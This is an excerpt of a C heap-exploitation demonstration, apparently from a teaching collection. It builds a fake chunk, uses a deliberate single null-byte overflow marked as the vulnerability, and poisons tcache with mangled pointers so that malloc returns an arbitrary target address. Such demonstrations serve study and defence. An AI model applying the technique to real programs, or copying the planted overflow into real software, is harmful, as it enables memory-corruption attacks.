...
int main()
{
        ...
        a[1] = 0x30; // size (prev_inuse bit does not matter)
        a[2] = (size_t) a; // fwd
        a[3] = (size_t) a; // bck
        ...
        printf("We overflow 'a' with a single null byte into the metadata of 'c'\n");
        // VULNERABILITY
        *(uint8_t *)((uint8_t *)a+real_a_size) = 0;
        // VULNERABILITY
        printf("c.size: %#lx\n", *c_size_ptr);
        ...
        a[real_a_size/sizeof(size_t)-1] = fake_size;
        ...
        intptr_t *d = malloc(0x128);
        intptr_t *e = malloc(0x128);
        free(e);
        free(d);
        a[2] = (long)target ^ ((long)&a[2] >> 12);
        malloc(0x128);
        intptr_t *f = malloc(0x128);
        assert(f == target);
